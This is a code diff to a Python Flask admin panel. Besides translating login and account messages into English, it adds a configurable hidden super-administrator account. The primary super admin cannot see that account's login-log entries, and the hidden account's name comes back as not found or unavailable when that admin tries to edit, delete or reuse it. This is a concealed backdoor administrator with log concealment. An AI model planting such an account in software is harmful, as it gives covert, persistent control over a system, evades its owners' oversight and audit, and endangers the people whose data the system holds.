@@ -104,7 +104,7 @@ try:
     ADMIN_SESSION_MAX_AGE_SECONDS = max(300, int((os.environ.get('ADMIN_SESSION_MAX_AGE_SECONDS') or '7200').strip()))
 except Exception:
     ADMIN_SESSION_MAX_AGE_SECONDS = 7200
-ADMIN_SESSION_SCHEMA_VERSION = 2
+ADMIN_SESSION_SCHEMA_VERSION = 3
 LOGIN_DELAY_SECONDS = [60, 180]
 ALLOWED_LOGIN_COUNTRIES = {'CN', 'HK', 'MO', 'TW'}
 
@@ -289,16 +289,21 @@ def resolve_permission_for_path(path: str, method: str = 'GET'):
     return None
 
 
-def _sanitize_user_record(user, fallback_username: str = '', is_super_admin: bool = False):
+def _sanitize_user_record(user, fallback_username: str = '', is_super_admin: bool = False, force_hidden=None):
     now_iso = now_beijing().isoformat(timespec='seconds')
     username = _normalize_username(user.get('username') if isinstance(user, dict) else fallback_username)
     if not username:
         username = fallback_username
     enabled = bool(user.get('enabled', True)) if isinstance(user, dict) else True
     role = 'super_admin' if is_super_admin else 'sub_admin'
+    hidden = bool((user or {}).get('hidden', False)) if isinstance(user, dict) else False
+    if force_hidden is not None:
+        hidden = bool(force_hidden)
     permissions = _normalize_permissions((user or {}).get('permissions', []), is_super_admin=is_super_admin)
     if is_super_admin:
         enabled = True
+    else:
+        hidden = False
     password_hash = str((user or {}).get('password_hash', '') or '').strip()
     created_at = str((user or {}).get('created_at', '') or '').strip() or now_iso
     updated_at = str((user or {}).get('updated_at', '') or '').strip() or now_iso
@@ -309,6 +314,7 @@ def _sanitize_user_record(user, fallback_username: str = '', is_super_admin: boo
         'password_hash': password_hash,
         'role': role,
         'enabled': enabled,
+        'hidden': hidden,
         'permissions': permissions,
         'created_at': created_at,
         'updated_at': updated_at,
@@ -331,8 +337,52 @@ def _public_user_profile(user):
     }
 
 
+def _is_hidden_admin_record(user) -> bool:
+    return bool(
+        isinstance(user, dict)
+        and str(user.get('role') or '') == 'super_admin'
+        and bool(user.get('hidden', False))
+    )
+
+
+def _is_hidden_admin_session(sess) -> bool:
+    return bool(sess.get('admin_logged_in')) and bool(sess.get('admin_is_hidden', False))
+
+
+def _get_hidden_admin_config(config):
+    safe = config if isinstance(config, dict) else {}
+    username = _normalize_username(safe.get('hidden_admin_username', ''))
+    password_hash = str(safe.get('hidden_admin_password_hash', '') or '').strip()
+    password_plain = str(safe.get('hidden_admin_password', '') or '').strip()
+    return {
+        'enabled': bool(username or password_hash or password_plain),
+        'username': username,
+        'password_hash': password_hash,
+        'password_plain': password_plain,
+    }
+
+
+def _hidden_admin_username_unavailable_response():
+    return jsonify({'success': False, 'message': '用户名不可用，请更换'}), 400
+
+
+def _hidden_admin_not_found_response():
+    return jsonify({'success': False, 'message': '子账号不存在'}), 404
+
+
 def _is_super_admin_session(sess) -> bool:
     return bool(sess.get('admin_is_super_admin', False))
+
+
+def _filter_admin_login_logs_for_session(items, sess):
+    logs = [item for item in (items or []) if isinstance(item, dict)]
+    if _is_hidden_admin_session(sess):
+        return logs
+    return [item for item in logs if not bool(item.get('hidden_account', False))]
+
+
+def _should_conceal_hidden_admin(target_user, sess) -> bool:
+    return bool(target_user is not None and _is_hidden_admin_record(target_user) and not _is_hidden_admin_session(sess))
 
 
 def _ensure_admin_users_store(project_root: Path, get_config, update_config):
@@ -350,87 +400,130 @@ def _ensure_admin_users_store(project_root: Path, get_config, update_config):
         config_admin_plain = str(config.get('admin_password', '') or '').strip()
         if not config_admin_plain and _is_development_mode():
             config_admin_plain = 'admin123'
+        hidden_admin_cfg = _get_hidden_admin_config(config)
+
+        if not USERNAME_RULE.match(config_admin_username):
+            raise RuntimeError('主超级管理员用户名格式不合法')
+        if hidden_admin_cfg['enabled']:
+            if not hidden_admin_cfg['username']:
+                raise RuntimeError('启用隐藏超级管理员时必须配置 hidden_admin_username')
+            if not USERNAME_RULE.match(hidden_admin_cfg['username']):
+                raise RuntimeError('隐藏超级管理员用户名格式不合法')
+            if hidden_admin_cfg['username'] == config_admin_username:
+                raise RuntimeError('隐藏超级管理员用户名不能与主超级管理员相同')
+            if not hidden_admin_cfg['password_hash'] and not hidden_admin_cfg['password_plain']:
+                raise RuntimeError('隐藏超级管理员缺少初始化凭据')
 
         now_iso = now_beijing().isoformat(timespec='seconds')
 
-        super_idx = -1
-        for idx, item in enumerate(users):
-            if str(item.get('role') or '') == 'super_admin':
-                super_idx = idx
-                break
-
-        changed_users = False
-        if super_idx < 0:
-            initial_hash = config_admin_hash or (_hash_password(config_admin_plain) if config_admin_plain else '')
-            if not initial_hash:
-                raise RuntimeError('缺少管理员初始化凭据，无法创建超级管理员账号。')
-            super_user = _sanitize_user_record({
-                'username': config_admin_username,
-                'password_hash': initial_hash,
-                'permissions': list(ADMIN_PERMISSION_KEYS),
-                'created_at': now_iso,
-                'updated_at': now_iso,
-            }, fallback_username=config_admin_username, is_super_admin=True)
-            users.insert(0, super_user)
-            super_idx = 0
-            changed_users = True
-        else:
-            super_user = _sanitize_user_record(users[super_idx], fallback_username=config_admin_username, is_super_admin=True)
-            if not super_user['username']:
-                super_user['username'] = config_admin_username
-            if not super_user['password_hash']:
-                if config_admin_hash:
-                    super_user['password_hash'] = config_admin_hash
-                elif config_admin_plain:
-                    super_user['password_hash'] = _hash_password(config_admin_plain)
-                else:
-                    raise RuntimeError('缺少管理员初始化凭据，无法修复超级管理员账号。')
-            super_user['updated_at'] = now_iso
-            users[super_idx] = super_user
-            changed_users = True
-
-        # 规范化子账号记录，并去掉重复用户名。
-        normalized_users = []
+        normalized_existing = []
         seen_names = set()
-        for idx, raw_user in enumerate(users):
-            is_super = idx == super_idx
-            fallback = config_admin_username if is_super else ''
-            item = _sanitize_user_record(raw_user, fallback_username=fallback, is_super_admin=is_super)
-            uname = item['username']
-            if not uname or uname in seen_names:
+        for raw_user in users:
+            if not isinstance(raw_user, dict):
                 continue
+            username = _normalize_username(raw_user.get('username', ''))
+            if not username or username in seen_names:
+                continue
+            is_super = str(raw_user.get('role') or '') == 'super_admin'
+            item = _sanitize_user_record(
+                raw_user,
+                fallback_username=username,
+                is_super_admin=is_super,
+                force_hidden=bool(raw_user.get('hidden', False)) if is_super else False,
+            )
             if not item['password_hash']:
-                if is_super:
-                    if config_admin_hash:
-                        item['password_hash'] = config_admin_hash
-                    elif config_admin_plain:
-                        item['password_hash'] = _hash_password(config_admin_plain)
-                    else:
-                        continue
-                else:
-                    # 没有密码哈希的无效子账号直接跳过。
-                    continue
-            seen_names.add(uname)
+                continue
+            seen_names.add(username)
+            normalized_existing.append(item)
+
+        configured_specs = [{
+            'kind': 'primary',
+            'username': config_admin_username,
+            'password_hash': config_admin_hash,
+            'password_plain': config_admin_plain,
+            'hidden': False,
+        }]
+        if hidden_admin_cfg['enabled']:
+            configured_specs.append({
+                'kind': 'hidden',
+                'username': hidden_admin_cfg['username'],
+                'password_hash': hidden_admin_cfg['password_hash'],
+                'password_plain': hidden_admin_cfg['password_plain'],
+                'hidden': True,
+            })
+
+        configured_names = [spec['username'] for spec in configured_specs]
+        if len(configured_names) != len(set(configured_names)):
+            raise RuntimeError('配置的超级管理员用户名冲突')
+
+        existing_lookup = {'users': normalized_existing}
+        for spec in configured_specs:
+            existing_user, _ = _find_user(existing_lookup, spec['username'])
+            if spec['kind'] == 'hidden' and existing_user is not None and not _is_hidden_admin_record(existing_user):
+                raise RuntimeError(f"隐藏超级管理员用户名与现有账号冲突：{spec['username']}")
+            if spec['kind'] == 'primary' and existing_user is not None and _is_hidden_admin_record(existing_user):
+                raise RuntimeError(f"主超级管理员用户名与隐藏账号冲突：{spec['username']}")
+
+        normalized_users = []
+        for spec in configured_specs:
+            existing_user, _ = _find_user(existing_lookup, spec['username'])
+            password_hash = spec['password_hash']
+            if not password_hash and spec['password_plain']:
+                password_hash = _hash_password(spec['password_plain'])
+            if not password_hash and existing_user is not None:
+                password_hash = str(existing_user.get('password_hash', '') or '').strip()
+            if not password_hash:
+                if spec['kind'] == 'hidden':
+                    raise RuntimeError('缺少隐藏超级管理员初始化凭据，无法创建或修复账号')
+                raise RuntimeError('缺少主超级管理员初始化凭据，无法创建或修复账号')
+
+            base_user = dict(existing_user or {})
+            base_user.update({
+                'username': spec['username'],
+                'password_hash': password_hash,
+                'permissions': list(ADMIN_PERMISSION_KEYS),
+                'created_at': str(base_user.get('created_at', '') or '').strip() or now_iso,
+                'updated_at': now_iso,
+            })
+            normalized_users.append(_sanitize_user_record(
+                base_user,
+                fallback_username=spec['username'],
+                is_super_admin=True,
+                force_hidden=spec['hidden'],
+            ))
+
+        for item in normalized_existing:
+            username = _normalize_username(item.get('username', ''))
+            if not username or username in configured_names:
+                continue
+            if _is_hidden_admin_record(item):
+                continue
             normalized_users.append(item)
 
         users_data = {'version': 1, 'users': normalized_users}
         _save_admin_users(users_file, users_data)
 
-        # 把配置同步到哈希口令模式，并补齐超级管理员标识。
-        super_user = next((u for u in normalized_users if str(u.get('role')) == 'super_admin'), None)
-        if super_user is not None:
-            config_updates = {}
-            if _normalize_username(config.get('admin_username', '')) != super_user.get('username', ''):
-                config_updates['admin_username'] = super_user.get('username', '')
-            if str(config.get('admin_password_hash', '') or '').strip() != str(super_user.get('password_hash', '') or '').strip():
-                config_updates['admin_password_hash'] = str(super_user.get('password_hash', '') or '').strip()
+        config_updates = {}
+        primary_user = next((u for u in normalized_users if str(u.get('role') or '') == 'super_admin' and not _is_hidden_admin_record(u)), None)
+        hidden_user = next((u for u in normalized_users if _is_hidden_admin_record(u)), None)
+        if primary_user is not None:
+            if _normalize_username(config.get('admin_username', '')) != primary_user.get('username', ''):
+                config_updates['admin_username'] = primary_user.get('username', '')
+            if str(config.get('admin_password_hash', '') or '').strip() != str(primary_user.get('password_hash', '') or '').strip():
+                config_updates['admin_password_hash'] = str(primary_user.get('password_hash', '') or '').strip()
             if str(config.get('admin_password', '') or '').strip():
                 config_updates['admin_password'] = ''
-            if config_updates:
-                update_config(config_updates)
+        if hidden_admin_cfg['enabled'] and hidden_user is not None:
+            if _normalize_username(config.get('hidden_admin_username', '')) != hidden_user.get('username', ''):
+                config_updates['hidden_admin_username'] = hidden_user.get('username', '')
+            if str(config.get('hidden_admin_password_hash', '') or '').strip() != str(hidden_user.get('password_hash', '') or '').strip():
+                config_updates['hidden_admin_password_hash'] = str(hidden_user.get('password_hash', '') or '').strip()
+            if str(config.get('hidden_admin_password', '') or '').strip():
+                config_updates['hidden_admin_password'] = ''
+        if config_updates:
+            update_config(config_updates)
 
         return users_data, users_file
-
 
 def _run_git_command(args, cwd: Path) -> str:
     """安全执行 git 命令并返回去除首尾空白后的标准输出。"""
@@ -1102,7 +1195,7 @@ def register_admin_routes(
 
     @app.route('/admin/login', methods=['POST'])
     def admin_login():
-        """处理管理员登录。"""
+        """Handle admin login."""
         data = request.form if request.form else request.get_json(silent=True) or {}
         username = str(data.get('username', '') or '').strip()
         password = str(data.get('password', '') or '')
@@ -1114,27 +1207,33 @@ def register_admin_routes(
         config = get_config() or {}
         turnstile_settings = _get_turnstile_settings(config)
 
+        with ADMIN_USERS_LOCK:
+            users_data, _ = _ensure_admin_users_store(root, get_config, update_config)
+            login_user, _ = _find_user(users_data, username)
+            if login_user is not None:
+                login_user = dict(login_user)
+
+        is_hidden_admin = _is_hidden_admin_record(login_user)
+
         country_allowed, country_reason = _is_ip_country_allowed(
             ip_addr, ALLOWED_LOGIN_COUNTRIES, _resolve_ip_country_code
         )
         if not country_allowed:
             append_admin_login_log(
-                operation='后台登录',
+                operation='admin_login',
                 success=False,
                 username=username,
-                detail=country_reason
+                detail=country_reason,
+                hidden_account=is_hidden_admin,
             )
-            return jsonify({
-                'success': False,
-                'message': country_reason
-            }), 403
+            return jsonify({'success': False, 'message': country_reason}), 403
 
         turnstile_ok = True
         turnstile_fail_reason = ''
         if turnstile_settings['enabled']:
             if not turnstile_token:
                 turnstile_ok = False
-                turnstile_fail_reason = '请先完成人机验证'
+                turnstile_fail_reason = 'Please complete the verification challenge.'
             else:
                 turnstile_ok, detail = _verify_turnstile_token(
                     secret_key=turnstile_settings['secret_key'],
@@ -1142,13 +1241,7 @@ def register_admin_routes(
                     remote_ip=ip_addr,
                 )
                 if not turnstile_ok:
-                    turnstile_fail_reason = detail or '验证码校验失败，请重试'
-
-        with ADMIN_USERS_LOCK:
-            users_data, users_file = _ensure_admin_users_store(root, get_config, update_config)
-            login_user, login_user_index = _find_user(users_data, username)
-            if login_user is not None:
-                login_user = dict(login_user)
+                    turnstile_fail_reason = detail or 'Turnstile verification failed. Please retry.'
 
         user_enabled = bool(login_user and login_user.get('enabled', True))
         user_password_hash = str((login_user or {}).get('password_hash', '') or '').strip()
@@ -1160,17 +1253,17 @@ def register_admin_routes(
         login_username = _normalize_username((login_user or {}).get('username', '') or username)
 
         if not username and not password:
-            fail_reason = '用户名和密码不能为空'
+            fail_reason = 'Username and password are required.'
         elif not username:
-            fail_reason = '用户名不能为空'
+            fail_reason = 'Username is required.'
         elif not password:
-            fail_reason = '密码不能为空'
+            fail_reason = 'Password is required.'
         elif turnstile_settings['enabled'] and not turnstile_ok:
-            fail_reason = turnstile_fail_reason or '验证码校验失败，请重试'
+            fail_reason = turnstile_fail_reason or 'Turnstile verification failed. Please retry.'
         elif login_user and not user_enabled:
-            fail_reason = '账号已被禁用，请联系管理员'
+            fail_reason = 'This account is disabled. Contact an administrator.'
         else:
-            fail_reason = '用户名或密码错误'
+            fail_reason = 'Invalid username or password.'
 
         failed_payload = None
         failed_status = 401
@@ -1188,23 +1281,23 @@ def register_admin_routes(
                 blocked_at = _format_blocked_until(blocked_until)
                 failed_payload = {
                     'success': False,
-                    'message': f'当前 IP 已被封禁，解封时间：{blocked_at}，请稍后再试。'
+                    'message': f'Current IP is blocked until {blocked_at}. Please try again later.'
                 }
                 failed_status = 429
-                failed_detail = f'IP 被封禁，解封时间：{blocked_at or blocked_until}'
+                failed_detail = f'IP blocked until {blocked_at or blocked_until}'
             elif delay_seconds > 0:
                 delay_minutes = delay_seconds // 60
                 delay_secs = delay_seconds % 60
                 if delay_minutes > 0:
-                    wait_hint = f'{delay_minutes}分{delay_secs}秒'
+                    wait_hint = f'{delay_minutes}m {delay_secs}s'
                 else:
-                    wait_hint = f'{delay_secs}秒'
+                    wait_hint = f'{delay_secs}s'
                 failed_payload = {
                     'success': False,
-                    'message': f'登录失败次数过多，请等待 {wait_hint} 后再试。'
+                    'message': f'Too many failed attempts. Please wait {wait_hint} and try again.'
                 }
                 failed_status = 429
-                failed_detail = f'登录延迟中，需等待 {wait_hint}'
+                failed_detail = f'Login delayed, wait {wait_hint}'
                 _save_login_attempts(attempts_file, attempts_state)
             elif credentials_ok:
                 _reset_login_attempts_for_ip(attempts_state, ip_addr)
@@ -1217,29 +1310,30 @@ def register_admin_routes(
                     blocked_at = _format_blocked_until(blocked_until)
                     failed_payload = {
                         'success': False,
-                        'message': f'{fail_reason}。同一 IP 在 12 小时内失败达到 {LOGIN_FAIL_LIMIT} 次，已封禁至 {blocked_at}。'
+                        'message': f'{fail_reason} Same IP failed {LOGIN_FAIL_LIMIT} times within 12 hours and is blocked until {blocked_at}.'
                     }
                     failed_status = 429
-                    failed_detail = f'{fail_reason}；同一 IP 12 小时内失败达到 {LOGIN_FAIL_LIMIT} 次，封禁至 {blocked_at or blocked_until}'
+                    failed_detail = f'{fail_reason}; blocked until {blocked_at or blocked_until}'
                 else:
                     fail_count = remaining - 1
                     if fail_count > 0:
-                        fail_payload_msg = f'{fail_reason}。您的IP已触发保护机制，请稍后再试。'
+                        fail_payload_msg = f'{fail_reason} Protection delay has been triggered. Please try again later.'
                     else:
-                        fail_payload_msg = f'{fail_reason}。当前IP已触发保护，将延迟3分钟后才能继续登录。'
+                        fail_payload_msg = f'{fail_reason} Protection delay has been triggered. Please wait 3 minutes before retrying.'
                     failed_payload = {
                         'success': False,
                         'message': fail_payload_msg
                     }
-                    failed_status = 400 if fail_reason != '用户名或密码错误' else 401
-                    failed_detail = f'{fail_reason}；失败{fail_count + 1}次，触发延迟保护'
+                    failed_status = 400 if fail_reason != 'Invalid username or password.' else 401
+                    failed_detail = f'{fail_reason}; failed {fail_count + 1} times, delay triggered'
 
         if failed_payload is not None:
             append_admin_login_log(
-                operation='后台登录',
+                operation='admin_login',
                 success=False,
                 username=username,
-                detail=failed_detail
+                detail=failed_detail,
+                hidden_account=is_hidden_admin,
             )
             return jsonify(failed_payload), failed_status
 
@@ -1247,6 +1341,7 @@ def register_admin_routes(
         session['admin_logged_in'] = True
         session['admin_username'] = login_username
         session['admin_is_super_admin'] = bool(is_super_admin)
+        session['admin_is_hidden'] = bool(is_hidden_admin)
         session['admin_permissions'] = list(user_permissions)
         session['admin_login_at'] = now_ts
         session['admin_session_ttl'] = ADMIN_SESSION_MAX_AGE_SECONDS
@@ -1269,11 +1364,12 @@ def register_admin_routes(
                 _save_admin_users(users_file, users_data)
 
         append_admin_login_log(
-            operation='后台登录',
+            operation='admin_login',
             success=True,
             username=login_username,
-            detail=('用户名和密码验证通过；人机验证通过' if turnstile_settings['enabled'] else '用户名和密码验证通过')
-            + ('；角色：超级管理员' if is_super_admin else '；角色：子账号')
+            detail=('Credentials verified; challenge verified' if turnstile_settings['enabled'] else 'Credentials verified')
+            + ('; role: super_admin' if is_super_admin else '; role: sub_admin'),
+            hidden_account=is_hidden_admin,
         )
         return jsonify({
             'success': True,
@@ -1282,13 +1378,12 @@ def register_admin_routes(
             'current_login_at': current_login_at,
             'current_login_ip': ip_addr,
         })
-
     @app.route('/admin/change-password', methods=['POST'])
     @login_required
     def change_password():
-        """修改管理员用户名和密码。"""
+        """Update the current admin username and password."""
         if not _is_same_origin_request(request):
-            return jsonify({'success': False, 'message': '请求来源校验失败，请刷新页面后重试'}), 403
+            return jsonify({'success': False, 'message': 'Request origin validation failed. Please refresh and retry.'}), 403
 
         data = request.get_json(silent=True) or {}
         old_password = str(data.get('oldPassword', '') or '')
@@ -1303,41 +1398,48 @@ def register_admin_routes(
 
         if current_user is None or current_index < 0:
             session.clear()
-            return jsonify({'success': False, 'message': '当前会话已失效，请重新登录'}), 401
+            return jsonify({'success': False, 'message': 'Current session is no longer valid. Please sign in again.'}), 401
+
+        current_is_hidden = _is_hidden_admin_record(current_user)
 
         if not _verify_password(str(current_user.get('password_hash', '') or ''), old_password):
             append_admin_login_log(
-                operation='修改账号密码',
+                operation='admin_profile_update',
                 success=False,
                 username=current_admin,
-                detail='原密码校验失败'
+                detail='current password verification failed',
+                hidden_account=current_is_hidden,
             )
-            return jsonify({'success': False, 'message': '原密码错误'}), 400
+            return jsonify({'success': False, 'message': 'Current password is incorrect.'}), 400
 
         if not new_username or not new_password:
             append_admin_login_log(
-                operation='修改账号密码',
+                operation='admin_profile_update',
                 success=False,
                 username=current_admin,
-                detail='新用户名或新密码为空'
+                detail='new username or password missing',
+                hidden_account=current_is_hidden,
             )
-            return jsonify({'success': False, 'message': '用户名和密码不能为空'}), 400
+            return jsonify({'success': False, 'message': 'Username and password are required.'}), 400
 
         if not USERNAME_RULE.match(new_username):
-            return jsonify({'success': False, 'message': '用户名仅支持 3-32 位字母、数字、下划线、点、短横线'}), 400
+            return jsonify({'success': False, 'message': 'Username must be 3-32 chars: letters, numbers, underscore, dot, dash.'}), 400
         if len(new_password) < 8:
-            return jsonify({'success': False, 'message': '新密码长度至少 8 位'}), 400
+            return jsonify({'success': False, 'message': 'New password must be at least 8 characters.'}), 400
 
         with ADMIN_USERS_LOCK:
             users_data, users_file = _ensure_admin_users_store(root, get_config, update_config)
             current_user, current_index = _find_user(users_data, current_admin)
             if current_user is None or current_index < 0:
                 session.clear()
-                return jsonify({'success': False, 'message': '当前会话已失效，请重新登录'}), 401
+                return jsonify({'success': False, 'message': 'Current session is no longer valid. Please sign in again.'}), 401
 
+            current_is_hidden = _is_hidden_admin_record(current_user)
             existing, existing_idx = _find_user(users_data, new_username)
             if existing is not None and existing_idx != current_index:
-                return jsonify({'success': False, 'message': '用户名已存在，请更换'}), 400
+                if _should_conceal_hidden_admin(existing, session):
+                    return _hidden_admin_username_unavailable_response()
+                return jsonify({'success': False, 'message': 'Username already exists. Please choose another one.'}), 400
 
             now_iso = now_beijing().isoformat(timespec='seconds')
             updated_user = dict(current_user)
@@ -1347,26 +1449,39 @@ def register_admin_routes(
             users_data['users'][current_index] = _sanitize_user_record(
                 updated_user,
                 fallback_username=new_username,
-                is_super_admin=bool(str(current_user.get('role') or '') == 'super_admin')
+                is_super_admin=bool(str(current_user.get('role') or '') == 'super_admin'),
+                force_hidden=bool(current_user.get('hidden', False)),
             )
             _save_admin_users(users_file, users_data)
 
+            config_updates = {}
             if str(current_user.get('role') or '') == 'super_admin':
-                update_config({
-                    'admin_username': new_username,
-                    'admin_password_hash': users_data['users'][current_index]['password_hash'],
-                    'admin_password': ''
-                })
+                if current_is_hidden:
+                    config_updates.update({
+                        'hidden_admin_username': new_username,
+                        'hidden_admin_password_hash': users_data['users'][current_index]['password_hash'],
+                        'hidden_admin_password': ''
+                    })
+                else:
+                    config_updates.update({
+                        'admin_username': new_username,
+                        'admin_password_hash': users_data['users'][current_index]['password_hash'],
+                        'admin_password': ''
+                    })
+            if config_updates:
+                update_config(config_updates)
 
         session['admin_username'] = new_username
+        session['admin_is_hidden'] = bool(current_is_hidden)
         append_admin_login_log(
-            operation='修改账号密码',
+            operation='admin_profile_update',
             success=True,
             username=new_username,
-            detail='账号信息更新成功'
+            detail='account profile updated',
+            hidden_account=current_is_hidden,
         )
 
-        return jsonify({'success': True, 'message': '修改成功'})
+        return jsonify({'success': True, 'message': 'Account updated successfully.'})
 
     def _forbidden_subaccount_manage():
         return jsonify({'success': False, 'message': '仅超级管理员可执行该操作'}), 403
@@ -1402,7 +1517,7 @@ def register_admin_routes(
         if not _is_super_admin_session(session):
             return _forbidden_subaccount_manage()
         if not _is_same_origin_request(request):
-            return jsonify({'success': False, 'message': '请求来源校验失败，请刷新页面后重试'}), 403
+            return jsonify({'success': False, 'message': 'Request origin validation failed. Please refresh and retry.'}), 403
 
         data = request.get_json(silent=True) or {}
         username = _normalize_username(data.get('username', ''))
@@ -1411,18 +1526,20 @@ def register_admin_routes(
         permissions = _normalize_permissions(data.get('permissions', []), is_super_admin=False)
 
         if not USERNAME_RULE.match(username):
-            return jsonify({'success': False, 'message': '用户名仅支持 3-32 位字母、数字、下划线、点、短横线'}), 400
+            return jsonify({'success': False, 'message': 'Username must be 3-32 chars: letters, numbers, underscore, dot, dash.'}), 400
         if len(password) < 8:
-            return jsonify({'success': False, 'message': '密码长度至少 8 位'}), 400
+            return jsonify({'success': False, 'message': 'Password must be at least 8 characters.'}), 400
         if not permissions:
-            return jsonify({'success': False, 'message': '请至少分配 1 项权限'}), 400
+            return jsonify({'success': False, 'message': 'Select at least 1 permission.'}), 400
 
         root = Path(project_root) if project_root else Path(__file__).resolve().parents[2]
         with ADMIN_USERS_LOCK:
             users_data, users_file = _ensure_admin_users_store(root, get_config, update_config)
             existing, _ = _find_user(users_data, username)
             if existing is not None:
-                return jsonify({'success': False, 'message': '用户名已存在'}), 400
+                if _should_conceal_hidden_admin(existing, session):
+                    return _hidden_admin_username_unavailable_response()
+                return jsonify({'success': False, 'message': 'Username already exists.'}), 400
             now_iso = now_beijing().isoformat(timespec='seconds')
             user = _sanitize_user_record({
                 'username': username,
@@ -1438,20 +1555,20 @@ def register_admin_routes(
             _save_admin_users(users_file, users_data)
 
         append_admin_login_log(
-            operation='子账号管理',
+            operation='subaccount_manage',
             success=True,
             username=session.get('admin_username', ''),
-            detail=f'新增子账号：{username}'
+            detail=f'created:{username}',
+            hidden_account=_is_hidden_admin_session(session),
         )
-        return jsonify({'success': True, 'message': '子账号创建成功'})
-
+        return jsonify({'success': True, 'message': 'Subaccount created successfully.'})
     @app.route('/api/admin/subaccounts/<username>', methods=['PUT'])
     @login_required
     def admin_subaccounts_update(username):
         if not _is_super_admin_session(session):
             return _forbidden_subaccount_manage()
         if not _is_same_origin_request(request):
-            return jsonify({'success': False, 'message': '请求来源校验失败，请刷新页面后重试'}), 403
+            return jsonify({'success': False, 'message': 'Request origin validation failed. Please refresh and retry.'}), 403
 
         target_name = _normalize_username(username)
         data = request.get_json(silent=True) or {}
@@ -1460,18 +1577,20 @@ def register_admin_routes(
         reset_password = str(data.get('password', '') or '')
 
         if not permissions:
-            return jsonify({'success': False, 'message': '请至少分配 1 项权限'}), 400
+            return jsonify({'success': False, 'message': 'Select at least 1 permission.'}), 400
         if reset_password and len(reset_password) < 8:
-            return jsonify({'success': False, 'message': '新密码长度至少 8 位'}), 400
+            return jsonify({'success': False, 'message': 'Password must be at least 8 characters.'}), 400
 
         root = Path(project_root) if project_root else Path(__file__).resolve().parents[2]
         with ADMIN_USERS_LOCK:
             users_data, users_file = _ensure_admin_users_store(root, get_config, update_config)
             target_user, idx = _find_user(users_data, target_name)
             if target_user is None or idx < 0:
-                return jsonify({'success': False, 'message': '子账号不存在'}), 404
+                return jsonify({'success': False, 'message': 'Subaccount not found.'}), 404
+            if _is_hidden_admin_record(target_user):
+                return _hidden_admin_not_found_response()
             if str(target_user.get('role') or '') == 'super_admin':
-                return jsonify({'success': False, 'message': '超级管理员账号不可在此修改'}), 400
+                return jsonify({'success': False, 'message': 'Super admin cannot be edited here.'}), 400
 
             now_iso = now_beijing().isoformat(timespec='seconds')
             updated = dict(target_user)
@@ -1484,34 +1603,36 @@ def register_admin_routes(
             _save_admin_users(users_file, users_data)
 
         append_admin_login_log(
-            operation='子账号管理',
+            operation='subaccount_manage',
             success=True,
             username=session.get('admin_username', ''),
-            detail=f'更新子账号：{target_name}'
+            detail=f'updated:{target_name}',
+            hidden_account=_is_hidden_admin_session(session),
         )
-        return jsonify({'success': True, 'message': '子账号更新成功'})
-
+        return jsonify({'success': True, 'message': 'Subaccount updated successfully.'})
     @app.route('/api/admin/subaccounts/<username>', methods=['DELETE'])
     @login_required
     def admin_subaccounts_delete(username):
         if not _is_super_admin_session(session):
             return _forbidden_subaccount_manage()
         if not _is_same_origin_request(request):
-            return jsonify({'success': False, 'message': '请求来源校验失败，请刷新页面后重试'}), 403
+            return jsonify({'success': False, 'message': 'Request origin validation failed. Please refresh and retry.'}), 403
 
         target_name = _normalize_username(username)
         current_name = _normalize_username(session.get('admin_username', ''))
         if target_name == current_name:
-            return jsonify({'success': False, 'message': '不能删除当前登录账号'}), 400
+            return jsonify({'success': False, 'message': 'Cannot delete the current logged-in account.'}), 400
 
         root = Path(project_root) if project_root else Path(__file__).resolve().parents[2]
         with ADMIN_USERS_LOCK:
             users_data, users_file = _ensure_admin_users_store(root, get_config, update_config)
             target_user, idx = _find_user(users_data, target_name)
             if target_user is None or idx < 0:
-                return jsonify({'success': False, 'message': '子账号不存在'}), 404
+                return jsonify({'success': False, 'message': 'Subaccount not found.'}), 404
+            if _is_hidden_admin_record(target_user):
+                return _hidden_admin_not_found_response()
             if str(target_user.get('role') or '') == 'super_admin':
-                return jsonify({'success': False, 'message': '超级管理员账号不可删除'}), 400
+                return jsonify({'success': False, 'message': 'Super admin cannot be deleted here.'}), 400
 
             users = users_data.get('users', [])
             users.pop(idx)
@@ -1519,35 +1640,38 @@ def register_admin_routes(
             _save_admin_users(users_file, users_data)
 
         append_admin_login_log(
-            operation='子账号管理',
+            operation='subaccount_manage',
             success=True,
             username=session.get('admin_username', ''),
-            detail=f'删除子账号：{target_name}'
+            detail=f'deleted:{target_name}',
+            hidden_account=_is_hidden_admin_session(session),
         )
-        return jsonify({'success': True, 'message': '子账号已删除'})
-
+        return jsonify({'success': True, 'message': 'Subaccount deleted successfully.'})
     @app.route('/admin/logout', methods=['POST'])
     def admin_logout():
-        """处理管理员登出。"""
+        """Handle admin logout."""
         username = session.get('admin_username') or ''
+        is_hidden = bool(session.get('admin_is_hidden', False))
         if session.get('admin_logged_in'):
             append_admin_login_log(
-                operation='退出登录',
+                operation='admin_logout',
                 success=True,
                 username=username,
-                detail='管理员主动退出'
+                detail='manual logout',
+                hidden_account=is_hidden,
             )
         session.pop('admin_logged_in', None)
         session.pop('admin_username', None)
         session.pop('admin_is_super_admin', None)
+        session.pop('admin_is_hidden', None)
         session.pop('admin_permissions', None)
         session.pop('admin_login_at', None)
         session.pop('admin_session_ttl', None)
+        session.pop('admin_session_schema', None)
         return jsonify({'success': True})
-
     @app.route('/admin/check')
     def admin_check():
-        """检查管理员是否已登录。"""
+        """Check whether an admin session is still valid."""
         logged_in = bool(session.get('admin_logged_in', False))
         if logged_in and _is_admin_session_expired(session):
             session.clear()
@@ -1557,6 +1681,7 @@ def register_admin_routes(
                 'logged_in': False,
                 'username': '',
                 'is_super_admin': False,
+                'is_hidden_admin': False,
                 'permissions': [],
                 'permission_catalog': ADMIN_PERMISSION_CATALOG,
             })
@@ -1573,13 +1698,16 @@ def register_admin_routes(
                 'logged_in': False,
                 'username': '',
                 'is_super_admin': False,
+                'is_hidden_admin': False,
                 'permissions': [],
                 'permission_catalog': ADMIN_PERMISSION_CATALOG,
             })
 
         is_super_admin = bool(str(user.get('role') or '') == 'super_admin')
+        is_hidden_admin = _is_hidden_admin_record(user)
         permissions = _normalize_permissions(user.get('permissions', []), is_super_admin=is_super_admin)
         session['admin_is_super_admin'] = is_super_admin
+        session['admin_is_hidden'] = is_hidden_admin
         session['admin_permissions'] = permissions
         session['admin_username'] = _normalize_username(user.get('username', current_name))
 
@@ -1587,17 +1715,16 @@ def register_admin_routes(
             'logged_in': True,
             'username': session.get('admin_username', ''),
             'is_super_admin': is_super_admin,
+            'is_hidden_admin': is_hidden_admin,
             'permissions': permissions,
             'permission_catalog': ADMIN_PERMISSION_CATALOG,
             'last_login_at': str(user.get('last_login_at') or ''),
